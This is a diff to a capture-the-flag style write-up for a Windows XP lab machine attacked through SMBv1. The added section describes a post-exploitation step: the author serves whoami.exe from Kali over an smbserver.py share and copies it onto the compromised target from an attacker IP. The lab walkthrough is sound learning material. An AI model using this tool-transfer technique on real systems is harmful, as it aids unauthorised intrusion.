@@ -82,4 +82,16 @@ In this scenario, the machine uses Windows XP, and for unsupported Windows opera
 Windows XP, Microsoft recommends that users discontinue the use of SMBv1.
 
 **Initial Shell Screenshot:**\
-<img src="images/legacy_initialshell.png" alt="initial_shell_poc" width="500" height="150"/>
+<img src="images/legacy_initialshell.png" alt="initial_shell_poc" width="500" height="150"/> </br> 
+
+<!--Privilege Escalation:-->
+
+**Privilege Escalation:**
+After getting access to the machine, I could not run the 'whoami' command, I tried using 'echo &username%' instead, but it didn't work.\
+To solve it, I transferred the 'whoami' command from my Kali Linux to the target machine.\
+the 'whoami.exe' binary in Kali is located in this directory: /usr/share/windows-resources/binaries/
+\
+In order to transfer this binary, I created a smb share:\
+smbserver.py a /usr/share/windows-resources/binaries/ 
+\
+And downloaded the file in the target machine: copy '\\\10.10.14.39\a\whoami.exe'
